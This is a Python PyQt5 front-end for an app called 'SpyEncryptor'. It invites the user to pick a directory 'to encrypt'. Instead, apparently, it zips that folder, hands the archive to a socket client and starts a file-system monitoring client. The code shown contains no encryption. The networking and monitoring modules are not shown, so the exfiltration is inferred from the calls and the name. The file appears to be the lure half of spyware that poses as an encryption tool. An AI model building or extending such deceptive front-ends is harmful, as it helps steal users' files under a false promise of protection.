import tkinter.filedialog as FileDialog

from PyQt5 import QtWidgets
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *

import resources_rc
from FileSystemEvent import start_client
from client_socket import connect
from zip_compressor import compress_dir


class Ui_MainWindow:
    def setupUi(self, MainWindow):

        if not MainWindow.objectName():
            MainWindow.setObjectName(u"MainWindow")
        MainWindow.resize(800, 600)
        MainWindow.setStyleSheet(u"background-color: rgba(170, 170, 255, 0.8);")
        self.window = MainWindow
        self.centralwidget = QWidget(MainWindow)
        self.centralwidget.setObjectName(u"centralwidget")
        self.labelLock = QLabel(self.centralwidget)
        self.labelLock.setObjectName(u"labelLock")
        self.labelLock.setGeometry(QRect(230, 130, 311, 321))
        self.labelLock.setStyleSheet(u"background-image: url(:/lock/lock-icon-11.png);\n"
                                     "background-color: rgba(0, 0, 0, 0.0);")
        self.labelTitle = QLabel(self.centralwidget)
        self.labelTitle.setObjectName(u"labelTitle")
        self.labelTitle.setGeometry(QRect(0, 10, 800, 110))
        font = QFont()
        font.setFamily(u"Narkisim")
        font.setPointSize(36)
        self.labelTitle.setFont(font)
        self.labelTitle.setStyleSheet(u"background-color: rgba(0, 0, 0, 0.0);")
        self.labelTitle.setAlignment(Qt.AlignCenter)
        self.pushButtonSelectDir = QPushButton(self.centralwidget)
        self.pushButtonSelectDir.setObjectName(u"pushButtonSelectDir")
        self.pushButtonSelectDir.setGeometry(QRect(270, 480, 231, 40))
        font1 = QFont()
        font1.setFamily(u"Narkisim")
        font1.setPointSize(14)
        self.pushButtonSelectDir.setFont(font1)
        self.pushButtonSelectDir.setCursor(QCursor(Qt.PointingHandCursor))
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QMenuBar(MainWindow)
        self.menubar.setObjectName(u"menubar")
        self.menubar.setGeometry(QRect(0, 0, 800, 21))
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QStatusBar(MainWindow)
        self.statusbar.setObjectName(u"statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)

        self.pushButtonSelectDir.clicked.connect(lambda: self.start_all())

        QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(QCoreApplication.translate("MainWindow", u"MainWindow", None))
        self.labelLock.setText("")
        self.labelTitle.setText(QCoreApplication.translate("MainWindow", u"Welcome to SpyEncryptor", None))
        self.pushButtonSelectDir.setText(
            QCoreApplication.translate("MainWindow", u"Select a Directory to Encrypt", None))

    def start_all(self):
        try:
            print('aaa')
            path = FileDialog.askdirectory()
            self.window.close()
            zip_path = path + r'\dir.zip'
            compress_dir(path, zip_path)

            connect(path, zip_path)
            start_client(path)
        except Exception as ex:
            print(ex)


if __name__ == '__main__':
    app = QtWidgets.QApplication([])
    window = QtWidgets.QMainWindow()
    Ui_MainWindow().setupUi(window)
    window.show()
    app.exec_()
